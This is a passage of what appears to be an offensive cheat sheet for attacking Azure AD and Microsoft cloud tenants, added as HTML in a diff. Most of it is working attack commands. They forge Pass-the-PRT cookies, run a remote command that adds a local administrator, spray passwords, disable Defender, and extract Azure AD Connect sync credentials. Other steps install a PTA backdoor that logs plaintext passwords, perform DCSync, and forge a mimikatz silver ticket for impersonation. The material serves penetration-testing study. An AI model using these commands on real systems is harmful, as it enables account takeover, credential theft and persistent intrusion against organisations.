+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span><span style="color:#75715e"># Generate a JWT</span>
+</span></span><span style="display:flex;"><span>PS&gt; Import-Module C:\Tools\AADInternals\AADInternals.psd1
+</span></span><span style="display:flex;"><span>PS AADInternals&gt; $PRT_OF_USER = <span style="color:#e6db74">&#39;...&#39;</span>
+</span></span><span style="display:flex;"><span>PS AADInternals&gt; <span style="color:#66d9ef">while</span>($PRT_OF_USER.Length % <span style="color:#ae81ff">4</span>) {$PRT_OF_USER += <span style="color:#e6db74">&#34;=&#34;</span>}
+</span></span><span style="display:flex;"><span>PS AADInternals&gt; $PRT = [<span style="color:#66d9ef">text.encoding</span>]::UTF8.GetString([<span style="color:#66d9ef">convert</span>]::FromBase64String($PRT_OF_USER))
+</span></span><span style="display:flex;"><span>PS AADInternals&gt; $ClearKey = <span style="color:#e6db74">&#34;XXYYZZ...&#34;</span>
+</span></span><span style="display:flex;"><span>PS AADInternals&gt; $SKey = [<span style="color:#66d9ef">convert</span>]::ToBase64String( [<span style="color:#66d9ef">byte[]</span>] ($ClearKey <span style="color:#f92672">-replace</span> <span style="color:#e6db74">&#39;..&#39;</span>, <span style="color:#e6db74">&#39;0x$&amp;,&#39;</span> -split <span style="color:#e6db74">&#39;,&#39;</span> <span style="color:#f92672">-ne</span> <span style="color:#e6db74">&#39;&#39;</span>))
+</span></span><span style="display:flex;"><span>PS AADInternals&gt; New-AADIntUserPRTToken -RefreshToken $PRT -SessionKey $SKey <span style="color:#960050;background-color:#1e0010">–</span>GetNonce
+</span></span><span style="display:flex;"><span>eyJ0eXAiOiJKV1QiL...
+</span></span></code></pre></div><p>The <code>&lt;Signed JWT&gt;</code> (JSON Web Token) can be used as PRT cookie in a (anonymous) browser session for 
+  <a href="https://login.microsoftonline.com/login.srf">https://login.microsoftonline.com/login.srf</a>. <br>
+Edit the Chrome cookie (F12) -&gt; Application -&gt; Cookies with the values:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>Name<span style="color:#960050;background-color:#1e0010">:</span> x-ms-RefreshTokenCredential
+</span></span><span style="display:flex;"><span>Value<span style="color:#960050;background-color:#1e0010">:</span> &lt;Signed JWT&gt;
+</span></span><span style="display:flex;"><span>HttpOnly<span style="color:#960050;background-color:#1e0010">:</span> <span style="color:#960050;background-color:#1e0010">√</span>
+</span></span></code></pre></div><p>:warning: Mark the cookie with the flags <code>HTTPOnly</code> and <code>Secure</code>.</p>
+<h2 id="pass-the-certificate">
+  Pass The Certificate
+  <a class="anchor" href="#pass-the-certificate">#</a>
+</h2>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-ps1" data-lang="ps1"><span style="display:flex;"><span>Copy-Item -ToSession $jumpvm -Path C:\Tools\PrtToCertmaster.zip -Destination C:\Users\Username\Documents\username <span style="color:#960050;background-color:#1e0010">–</span>Verbose
+</span></span><span style="display:flex;"><span>Expand-Archive -Path C:\Users\Username\Documents\username\PrtToCert-master.zip -DestinationPath C:\Users\Username\Documents\username\PrtToCert
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Require the PRT, TenantID, Context and DerivedKey</span>
+</span></span><span style="display:flex;"><span>&amp; <span style="color:#e6db74">&#39;C:\Program Files\Python39\python.exe&#39;</span> C:\Users\Username\Documents\username\PrtToCert\RequestCert.py --tenantId &lt;TENANT-ID&gt; --prt &lt;PRT&gt; --userName &lt;Username&gt;@&lt;TENANT NAME&gt;.onmicrosoft.com --hexCtx &lt;HEX-CONTEXT&gt; --hexDerivedKey &lt;HEX-DERIVED-KEY&gt;
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># PFX saved with the name &lt;Username&gt;@&lt;TENANT NAME&gt;.onmicrosoft.com.pfx and password AzureADCert</span>
+</span></span></code></pre></div><p>Python tool that will authenticate to the remote machine, run PSEXEC and open a CMD on the victim machine</p>
+<p>
+  <a href="https://github.com/morRubin/AzureADJoinedMachinePTC">https://github.com/morRubin/AzureADJoinedMachinePTC</a></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-ps1" data-lang="ps1"><span style="display:flex;"><span>Main.py [-h] --usercert USERCERT --certpass CERTPASS --remoteip REMOTEIP
+</span></span><span style="display:flex;"><span>Main.py --usercert <span style="color:#e6db74">&#34;admin.pfx&#34;</span> --certpass password --remoteip <span style="color:#ae81ff">10.10</span>.10.10
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>python Main.py --usercert C:\Users\Username\Documents\username\&lt;USERNAME&gt;@&lt;TENANT NAME&gt;.onmicrosoft.com.pfx --
+</span></span><span style="display:flex;"><span>certpass AzureADCert --remoteip <span style="color:#ae81ff">10.10</span>.10.10 --command <span style="color:#e6db74">&#34;cmd.exe /c net user username Password@123 /add /Y &amp;&amp; net localgroup administrators username /add&#34;</span>
+</span></span></code></pre></div><h2 id="intunes-administration">
+  Intunes Administration
+  <a class="anchor" href="#intunes-administration">#</a>
+</h2>
+<p>Requirements:</p>
+<ul>
+<li><strong>Global Administrator</strong> or <strong>Intune Administrator</strong> Privilege : <code>Get-AzureADGroup -Filter &quot;DisplayName eq 'Intune Administrators'&quot;</code></li>
+</ul>
+<ol>
+<li>Login into 
+  <a href="https://endpoint.microsoft.com/#home">https://endpoint.microsoft.com/#home</a> or use Pass-The-PRT</li>
+<li>Go to <strong>Devices</strong> -&gt; <strong>All Devices</strong> to check devices enrolled to Intune</li>
+<li>Go to <strong>Scripts</strong> and click on <strong>Add</strong> for Windows 10.</li>
+<li>Add a <strong>Powershell script</strong></li>
+<li>Specify <strong>Add all users</strong> and <strong>Add all devices</strong> in the <strong>Assignments</strong> page.</li>
+</ol>
+<p>:warning: It will take up to one hour before you script is executed !</p>
+<h2 id="dynamic-group-membership">
+  Dynamic Group Membership
+  <a class="anchor" href="#dynamic-group-membership">#</a>
+</h2>
+<p>Get groups that allow Dynamic membership: <code>Get-AzureADMSGroup | ?{$_.GroupTypes -eq 'DynamicMembership'}</code></p>
+<p>Rule example : <code>(user.otherMails -any (_ -contains &quot;vendor&quot;)) -and (user.userType -eq &quot;guest&quot;)</code> <br>
+Rule description: Any Guest user whose secondary email contains the string &lsquo;vendor&rsquo; will be added to the group</p>
+<ol>
+<li>Open user&rsquo;s profile, click on <strong>Manage</strong></li>
+<li>Click on <strong>Resend</strong> invite and to get an invitation URL</li>
+<li>Set the secondary email
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>PS&gt; Set-AzureADUser -ObjectId &lt;OBJECT-ID&gt; -OtherMails &lt;Username&gt;@&lt;TENANT NAME&gt;.onmicrosoft.com -Verbose
+</span></span></code></pre></div></li>
+</ol>
+<h2 id="administrative-unit">
+  Administrative Unit
+  <a class="anchor" href="#administrative-unit">#</a>
+</h2>
+<blockquote>
+<p>Administrative Unit can reset password of another user</p>
+</blockquote>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>PS AzureAD&gt; Get-AzureADMSAdministrativeUnit -Id &lt;ID&gt;
+</span></span><span style="display:flex;"><span>PS AzureAD&gt; Get-AzureADMSAdministrativeUnitMember -Id &lt;ID&gt;
+</span></span><span style="display:flex;"><span>PS AzureAD&gt; Get-AzureADMSScopedRoleMembership -Id &lt;ID&gt; | fl
+</span></span><span style="display:flex;"><span>PS AzureAD&gt; Get-AzureADDirectoryRole -ObjectId &lt;RoleId&gt;
+</span></span><span style="display:flex;"><span>PS AzureAD&gt; Get-AzureADUser -ObjectId &lt;RoleMemberInfo.Id&gt; | fl 
+</span></span><span style="display:flex;"><span>PS C:\Tools&gt; $password = <span style="color:#e6db74">&#34;Password&#34;</span> | ConvertToSecureString -AsPlainText -Force
+</span></span><span style="display:flex;"><span>PS C:\Tools&gt; (Get-AzureADUser -All $true | ?{$_.UserPrincipalName <span style="color:#f92672">-eq</span> <span style="color:#e6db74">&#34;&lt;Username&gt;@&lt;TENANT NAME&gt;.onmicrosoft.com&#34;</span>}).ObjectId | SetAzureADUserPassword -Password $Password -Verbose
+</span></span></code></pre></div><h2 id="deployment-template">
+  Deployment Template
+  <a class="anchor" href="#deployment-template">#</a>
+</h2>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>PS Az&gt; Get-AzResourceGroup
+</span></span><span style="display:flex;"><span>PS Az&gt; Get-AzResourceGroupDeployment -ResourceGroupName SAP
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Export</span>
+</span></span><span style="display:flex;"><span>PS Az&gt; Save-AzResourceGroupDeploymentTemplate -ResourceGroupName &lt;RESOURCE GROUP&gt; -DeploymentName &lt;DEPLOYMENT NAME&gt;
+</span></span><span style="display:flex;"><span>cat &lt;DEPLOYMENT NAME&gt;.json <span style="color:#75715e"># search for hardcoded password</span>
+</span></span><span style="display:flex;"><span>cat &lt;PATH TO .json FILE&gt; | Select-String password
+</span></span></code></pre></div><h2 id="application-proxy">
+  Application Proxy
+  <a class="anchor" href="#application-proxy">#</a>
+</h2>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span><span style="color:#75715e"># Enumerate application that have Proxy</span>
+</span></span><span style="display:flex;"><span>PS C:\Tools&gt; Get-AzureADApplication | %{<span style="color:#66d9ef">try</span>{GetAzureADApplicationProxyApplication -ObjectId $_.ObjectID;$_.DisplayName;$_.ObjectID}<span style="color:#66d9ef">catch</span>{}}
+</span></span><span style="display:flex;"><span>PS C:\Tools&gt; Get-AzureADServicePrincipal -All $true | ?{$_.DisplayName <span style="color:#f92672">-eq</span> <span style="color:#e6db74">&#34;Finance Management System&#34;</span>}
+</span></span><span style="display:flex;"><span>PS C:\Tools&gt; . C:\Tools\GetApplicationProxyAssignedUsersAndGroups.ps1
+</span></span><span style="display:flex;"><span>PS C:\Tools&gt; Get-ApplicationProxyAssignedUsersAndGroups -ObjectId &lt;OBJECT-ID&gt;
+</span></span></code></pre></div><h2 id="conditional-access">
+  Conditional Access
+  <a class="anchor" href="#conditional-access">#</a>
+</h2>
+<ul>
+<li>Bypassing conditional access by copying User-Agent (Chrome Dev Tool &gt; Select iPad Pro, etc)</li>
+<li>Bypassing conditional access by faking device compliance
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span><span style="color:#75715e"># AAD Internals - Making your device compliant</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Get an access token for AAD join and save to cache</span>
+</span></span><span style="display:flex;"><span>Get-AADIntAccessTokenForAADJoin -SaveToCache
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Join the device to Azure AD</span>
+</span></span><span style="display:flex;"><span>Join-AADIntDeviceToAzureAD -DeviceName <span style="color:#e6db74">&#34;SixByFour&#34;</span> -DeviceType <span style="color:#e6db74">&#34;Commodore&#34;</span> -OSVersion <span style="color:#e6db74">&#34;C64&#34;</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Marking device compliant - option 1: Registering device to Intune</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Get an access token for Intune MDM and save to cache (prompts for credentials)</span>
+</span></span><span style="display:flex;"><span>Get-AADIntAccessTokenForIntuneMDM -PfxFileName .\d03994c9-24f8-41ba-a156-1805998d6dc7.pfx -SaveToCache 
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Join the device to Intune</span>
+</span></span><span style="display:flex;"><span>Join-AADIntDeviceToIntune -DeviceName <span style="color:#e6db74">&#34;SixByFour&#34;</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Start the call back</span>
+</span></span><span style="display:flex;"><span>Start-AADIntDeviceIntuneCallback -PfxFileName .\d03994c9-24f8-41ba-a156-1805998d6dc7-MDM.pfx -DeviceName <span style="color:#e6db74">&#34;SixByFour&#34;</span>
+</span></span></code></pre></div></li>
+</ul>
+<h2 id="azure-ad">
+  Azure AD
+  <a class="anchor" href="#azure-ad">#</a>
+</h2>
+<p>With Microsoft, if you are using any cloud services (Office 365, Exchange Online, etc) with Active Directory (on-prem or in Azure) then an attacker is one credential away from being able to leak your entire Active Directory structure thanks to Azure AD.</p>
+<ol>
+<li>Authenticate to your webmail portal (i.e. 
+  <a href="https://webmail.domain.com/">https://webmail.domain.com/</a>)</li>
+<li>Change your browser URL to: 
+  <a href="https://azure.microsoft.com/">https://azure.microsoft.com/</a></li>
+<li>Pick the account from the active sessions</li>
+<li>Select Azure Active Directory and enjoy!</li>
+</ol>
+<h3 id="azure-ad-vs-active-directory">
+  Azure AD vs Active Directory
+  <a class="anchor" href="#azure-ad-vs-active-directory">#</a>
+</h3>
+<table>
+<thead>
+<tr>
+<th>Active Directory</th>
+<th>Azure AD</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>LDAP</td>
+<td>REST API&rsquo;S</td>
+</tr>
+<tr>
+<td>NTLM/Kerberos</td>
+<td>OAuth/SAML/OpenID</td>
+</tr>
+<tr>
+<td>Structured directory (OU tree)</td>
+<td>Flat structure</td>
+</tr>
+<tr>
+<td>GPO</td>
+<td>No GPO&rsquo;s</td>
+</tr>
+<tr>
+<td>Super fine-tuned access controls</td>
+<td>Predefined roles</td>
+</tr>
+<tr>
+<td>Domain/forest</td>
+<td>Tenant</td>
+</tr>
+<tr>
+<td>Trusts</td>
+<td>Guests</td>
+</tr>
+</tbody>
+</table>
+<ul>
+<li>
+<p>Password Hash Syncronization (PHS)</p>
+<ul>
+<li>Passwords from on-premise AD are sent to the cloud</li>
+<li>Use replication via a service account created by AD Connect</li>
+</ul>
+</li>
+<li>
+<p>Pass Through Authentication (PTA)</p>
+<ul>
+<li>Possible to perform DLL injection into the PTA agent and intercept authentication requests: credentials in clear-text</li>
+</ul>
+</li>
+<li>
+<p>Connect Windows Server AD to Azure AD using Federation Server (ADFS)</p>
+<ul>
+<li>Dir-Sync : Handled by on-premise Windows Server AD, sync username/password</li>
+</ul>
+</li>
+<li>
+<p>Azure AD Joined : 
+  <a href="https://pbs.twimg.com/media/EQZv62NWAAEQ8wE?format=jpg&amp;name=large">https://pbs.twimg.com/media/EQZv62NWAAEQ8wE?format=jpg&name=large</a></p>
+</li>
+<li>
+<p>Workplace Joined : 
+  <a href="https://pbs.twimg.com/media/EQZv7UHXsAArdhn?format=jpg&amp;name=large">https://pbs.twimg.com/media/EQZv7UHXsAArdhn?format=jpg&name=large</a></p>
+</li>
+<li>
+<p>Hybrid Joined : 
+  <a href="https://pbs.twimg.com/media/EQZv77jXkAAC4LK?format=jpg&amp;name=large">https://pbs.twimg.com/media/EQZv77jXkAAC4LK?format=jpg&name=large</a></p>
+</li>
+<li>
+<p>Workplace joined on AADJ or Hybrid : 
+  <a href="https://pbs.twimg.com/media/EQZv8qBX0AAMWuR?format=jpg&amp;name=large">https://pbs.twimg.com/media/EQZv8qBX0AAMWuR?format=jpg&name=large</a></p>
+</li>
+</ul>
+<h3 id="password-spray">
+  Password Spray
+  <a class="anchor" href="#password-spray">#</a>
+</h3>
+<blockquote>
+<p>Default lockout policy of 10 failed attempts, locking out an account for 60 seconds</p>
+</blockquote>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>git clone https<span style="color:#960050;background-color:#1e0010">:</span>//github.com/dafthack/MSOLSpray
+</span></span><span style="display:flex;"><span>Import-Module .\MSOLSpray.ps1
+</span></span><span style="display:flex;"><span>Invoke-MSOLSpray -UserList .\userlist.txt -Password Winter2020
+</span></span><span style="display:flex;"><span>Invoke-MSOLSpray -UserList .\users.txt -Password d0ntSprayme!
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># UserList  - UserList file filled with usernames one-per-line in the format &#34;user@domain.com&#34;</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Password  - A single password that will be used to perform the password spray.</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># OutFile   - A file to output valid results to.</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Force     - Forces the spray to continue and not stop when multiple account lockouts are detected.</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># URL       - The URL to spray against. Potentially useful if pointing at an API Gateway URL generated with something like FireProx to randomize the IP address you are authenticating from.</span>
+</span></span></code></pre></div><h3 id="convert-guid-to-sid">
+  Convert GUID to SID
+  <a class="anchor" href="#convert-guid-to-sid">#</a>
+</h3>
+<p>The user&rsquo;s AAD id is translated to SID by concatenating <code>&quot;S-1–12–1-&quot;</code> to the decimal representation of each section of the AAD Id.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>GUID<span style="color:#960050;background-color:#1e0010">:</span> [base16(a1)]-[base16(a2)]-[ base16(a3)]-[base16(a4)]
+</span></span><span style="display:flex;"><span>SID<span style="color:#960050;background-color:#1e0010">:</span> S-<span style="color:#ae81ff">1</span><span style="color:#960050;background-color:#1e0010">–</span><span style="color:#ae81ff">12</span><span style="color:#960050;background-color:#1e0010">–</span><span style="color:#ae81ff">1</span>-[base10(a1)]-[ base10(a2)]-[ base10(a3)]-[ base10(a4)]
+</span></span></code></pre></div><p>For example, the representation of <code>6aa89ecb-1f8f-4d92–810d-b0dce30b6c82</code> is <code>S-1–12–1–1789435595–1301421967–3702525313–2188119011</code></p>
+<h2 id="azure-ad-connect">
+  Azure AD Connect
+  <a class="anchor" href="#azure-ad-connect">#</a>
+</h2>
+<p>Check if Azure AD Connect is installed : <code>Get-ADSyncConnector</code></p>
+<ul>
+<li>For <strong>PHS</strong>, we can extract the credentials</li>
+<li>For <strong>PTA</strong>, we can install the agent</li>
+<li>For <strong>Federation</strong>, we can extract the certificate from ADFS server using DA</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>PS &gt; Set-MpPreference -DisableRealtimeMonitoring $true
+</span></span><span style="display:flex;"><span>PS &gt; Copy-Item -ToSession $adcnct -Path C:\Tools\AADInternals.0.4.5.zip -Destination C:\Users\Administrator\Documents
+</span></span><span style="display:flex;"><span>PS &gt; Expand-Archive C:\Users\Administrator\Documents\AADInternals.0.4.5.zip -DestinationPath C:\Users\Administrator\Documents\AADInternals
+</span></span><span style="display:flex;"><span>PS &gt; Import-Module C:\Users\Administrator\Documents\AADInternals\AADInternals.psd1
+</span></span><span style="display:flex;"><span>PS &gt; Get-AADIntSyncCredentials
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Get Token for SYNC account and reset on-prem admin password</span>
+</span></span><span style="display:flex;"><span>PS &gt; $passwd = ConvertToSecureString <span style="color:#e6db74">&#39;password&#39;</span> -AsPlainText -Force
+</span></span><span style="display:flex;"><span>PS &gt; $creds = New-Object System.Management.Automation.PSCredential (<span style="color:#e6db74">&#34;&lt;Username&gt;@&lt;TenantName&gt;.onmicrosoft.com&#34;</span>, $passwd)
+</span></span><span style="display:flex;"><span>PS &gt; GetAADIntAccessTokenForAADGraph -Credentials $creds <span style="color:#960050;background-color:#1e0010">–</span>SaveToCache
+</span></span><span style="display:flex;"><span>PS &gt; Get-AADIntUser -UserPrincipalName onpremadmin@defcorpsecure.onmicrosoft.com | select ImmutableId
+</span></span><span style="display:flex;"><span>PS &gt; Set-AADIntUserPassword -SourceAnchor <span style="color:#e6db74">&#34;&lt;IMMUTABLE-ID&gt;&#34;</span> -Password <span style="color:#e6db74">&#34;Password&#34;</span> -Verbose
+</span></span></code></pre></div><ol>
+<li>Check if PTA is installed : <code>Get-Command -Module PassthroughAuthPSModule</code></li>
+<li>Install a PTA Backdoor
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>PS AADInternals&gt; Install-AADIntPTASpy
+</span></span><span style="display:flex;"><span>PS AADInternals&gt; Get-AADIntPTASpyLog -DecodePasswords
+</span></span></code></pre></div></li>
+</ol>
+<h3 id="azure-ad-connect---password-extraction">
+  Azure AD Connect - Password extraction
+  <a class="anchor" href="#azure-ad-connect---password-extraction">#</a>
+</h3>
+<p>Credentials in AD Sync : C:\Program Files\Microsoft Azure AD Sync\Data\ADSync.mdf</p>
+<table>
+<thead>
+<tr>
+<th>Tool</th>
+<th>Requires code execution on target</th>
+<th>DLL dependencies</th>
+<th>Requires MSSQL locally</th>
+<th>Requires python locally</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>ADSyncDecrypt</td>
+<td>Yes</td>
+<td>Yes</td>
+<td>No</td>
+<td>No</td>
+</tr>
+<tr>
+<td>ADSyncGather</td>
+<td>Yes</td>
+<td>No</td>
+<td>No</td>
+<td>Yes</td>
+</tr>
+<tr>
+<td>ADSyncQuery</td>
+<td>No (network RPC calls only)</td>
+<td>No</td>
+<td>Yes</td>
+<td>Yes</td>
+</tr>
+</tbody>
+</table>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>git clone https<span style="color:#960050;background-color:#1e0010">:</span>//github.com/fox-it/adconnectdump
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># DCSync with AD Sync account</span>
+</span></span></code></pre></div><h3 id="azure-ad-connect---msol-accounts-password-and-dcsync">
+  Azure AD Connect - MSOL Account&rsquo;s password and DCSync
+  <a class="anchor" href="#azure-ad-connect---msol-accounts-password-and-dcsync">#</a>
+</h3>
+<p>You can perform <strong>DCSync</strong> attack using the MSOL account.</p>
+<p>Requirements:</p>
+<ul>
+<li>Compromise a server with Azure AD Connect service</li>
+<li>Access to ADSyncAdmins or local Administrators groups</li>
+</ul>
+<p>Use the script <strong>azuread_decrypt_msol.ps1</strong> from @xpn to recover the decrypted password for the MSOL account:</p>
+<ul>
+<li><code>azuread_decrypt_msol.ps1</code>: AD Connect Sync Credential Extract POC 
+  <a href="https://gist.github.com/xpn/0dc393e944d8733e3c63023968583545">https://gist.github.com/xpn/0dc393e944d8733e3c63023968583545</a></li>
+<li><code>azuread_decrypt_msol_v2.ps1</code>: Updated method of dumping the MSOL service account (which allows a DCSync) used by Azure AD Connect Sync 
+  <a href="https://gist.github.com/xpn/f12b145dba16c2eebdd1c6829267b90c">https://gist.github.com/xpn/f12b145dba16c2eebdd1c6829267b90c</a></li>
+</ul>
+<p>Now you can use the retrieved credentials for the MSOL Account to launch a DCSync attack.</p>
+<h3 id="azure-ad-connect---seamless-single-sign-on-silver-ticket">
+  Azure AD Connect - Seamless Single Sign On Silver Ticket
+  <a class="anchor" href="#azure-ad-connect---seamless-single-sign-on-silver-ticket">#</a>
+</h3>
+<blockquote>
+<p>Anyone who can edit properties of the AZUREADSSOACCS$ account can impersonate any user in Azure AD using Kerberos (if no MFA)</p>
+</blockquote>
+<blockquote>
+<p>Seamless SSO is supported by both PHS and PTA. If seamless SSO is enabled, a computer account <strong>AZUREADSSOC</strong> is created in the on-prem AD.</p>
+</blockquote>
+<p>:warning: The password of the AZUREADSSOACC account never changes.</p>
+<p>Using 
+  <a href="https://autologon.microsoftazuread-sso.com/">https://autologon.microsoftazuread-sso.com/</a> to convert Kerberos tickets to SAML and JWT for Office 365 &amp; Azure</p>
+<ol>
+<li>NTLM password hash of the AZUREADSSOACC account, e.g. <code>f9969e088b2c13d93833d0ce436c76dd</code>.
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>mimikatz.exe <span style="color:#e6db74">&#34;lsadump::dcsync /user:AZUREADSSOACC$&#34;</span> exit
+</span></span></code></pre></div></li>
+<li>AAD logon name of the user we want to impersonate, e.g. <code>elrond@contoso.com</code>. This is typically either his userPrincipalName or mail attribute from the on-prem AD.</li>
+<li>SID of the user we want to impersonate, e.g. <code>S-1-5-21-2121516926-2695913149-3163778339-1234</code>.</li>
+<li>Create the Silver Ticket and inject it into Kerberos cache:
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>mimikatz.exe <span style="color:#e6db74">&#34;kerberos::golden /user:elrond
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">/sid:S-1-5-21-2121516926-2695913149-3163778339 /id:1234
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">/domain:contoso.local /rc4:f9969e088b2c13d93833d0ce436c76dd
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">/target:aadg.windows.net.nsatc.net /service:HTTP /ptt&#34;</span> exit
+</span></span></code></pre></div></li>
+<li>Launch Mozilla Firefox</li>
+<li>Go to about:config and set the <code>network.negotiate-auth.trusted-uris preference</code> to value <code>https://aadg.windows.net.nsatc.net,https://autologon.microsoftazuread-sso.com</code></li>
+<li>Navigate to any web application that is integrated with our AAD domain. Fill in the user name, while leaving the password field empty.</li>
+</ol>
+<h2 id="references">
+  References
+  <a class="anchor" href="#references">#</a>
+</h2>
+<ul>
+<li>
+  <a href="https://www.alteredsecurity.com/post/introduction-to-365-stealer">Introduction To 365-Stealer - Understanding and Executing the Illicit Consent Grant Attack</a></li>
+<li>
+  <a href="https://www.youtube.com/watch?v=51FSvndgddk&amp;list=WL">Learn with @trouble1_raunak: Cloud Pentesting - Azure (Illicit Consent Grant Attack) !!</a></li>
+<li>
+  <a href="https://derkvanderwoude.medium.com/pass-the-prt-attack-and-detection-by-microsoft-defender-for-afd7dbe83c94">Pass-the-PRT attack and detection by Microsoft Defender for … - Derk van der Woude - Jun 9</a></li>
+<li>
+  <a href="https://medium.com/@mor2464/azure-ad-pass-the-certificate-d0c5de624597">Azure AD Pass The Certificate - Mor - Aug 19, 2020</a></li>
+<li>
+  <a href="https://zhiliaxu.github.io/app-service-managed-identity.html">Get Access Tokens for Managed Service Identity on Azure App Service</a></li>
+<li>
+  <a href="https://o365blog.com/post/mdm/">Bypassing conditional access by faking device compliance - September 06, 2020 - @DrAzureAD</a></li>
+<li>
+  <a href="https://github.com/0xJs/CARTP-cheatsheet/blob/main/Authenticated-enumeration.md">CARTP-cheatsheet - Azure AD cheatsheet for the CARTP course</a></li>
+<li>
+  <a href="https://www.netspi.com/blog/technical/cloud-penetration-testing/get-azurepasswords/">Get-AzurePasswords: A Tool for Dumping Credentials from Azure Subscriptions - August 28, 2018 - Karl Fosaaen</a></li>
+<li>
+  <a href="https://akimbocore.com/article/introduction-to-pentesting-azure/">An introduction to penetration testing Azure - Akimbocore</a></li>
+<li>
+  <a href="https://blog.netspi.com/running-powershell-scripts-on-azure-vms/">Running Powershell scripts on Azure VM - Netspi</a></li>
+<li>
+  <a href="https://blog.netspi.com/attacking-azure-cloud-shell/">Attacking Azure Cloud shell - Netspi</a></li>
+<li>
+  <a href="https://blog.netspi.com/maintaining-azure-persistence-via-automation-accounts/">Maintaining Azure Persistence via automation accounts - Netspi</a></li>
+<li>
+  <a href="https://www.smartspate.com/detecting-an-attacks-on-active-directory-with-azure/">Detecting an attacks on active directory with Azure - Smartspate</a></li>
+<li>
+  <a href="https://www.youtube.com/watch?v=l_pnNpdxj20">Azure AD Overview</a></li>
+<li>
+  <a href="https://www.youtube.com/watch?v=IcSATObaQZE">Windows Azure Active Directory in plain English</a></li>
+<li>
+  <a href="https://medium.com/@kamran.bilgrami/ethical-hacking-lessons-building-free-active-directory-lab-in-azure-6c67a7eddd7f">Building Free Active Directory Lab in Azure - @kamran.bilgrami</a></li>
+<li>
+  <a href="https://posts.specterops.io/attacking-azure-azure-ad-and-introducing-powerzure-ca70b330511a">Attacking Azure/Azure AD and introducing Powerzure - SpecterOps</a></li>
+<li>
+  <a href="https://blog.xpnsec.com/azuread-connect-for-redteam/">Azure AD connect for RedTeam - @xpnsec</a></li>
+<li>
+  <a href="https://blog.netspi.com/azure-privilege-escalation-using-managed-identities/">Azure Privilege Escalation Using Managed Identities - Karl Fosaaen - February 20th, 2020</a></li>
+<li>
+  <a href="https://www.lares.com/hunting-azure-admins-for-vertical-escalation/">Hunting Azure Admins for Vertical Escalation - LEE KAGAN - MARCH 13, 2020</a></li>
+<li>
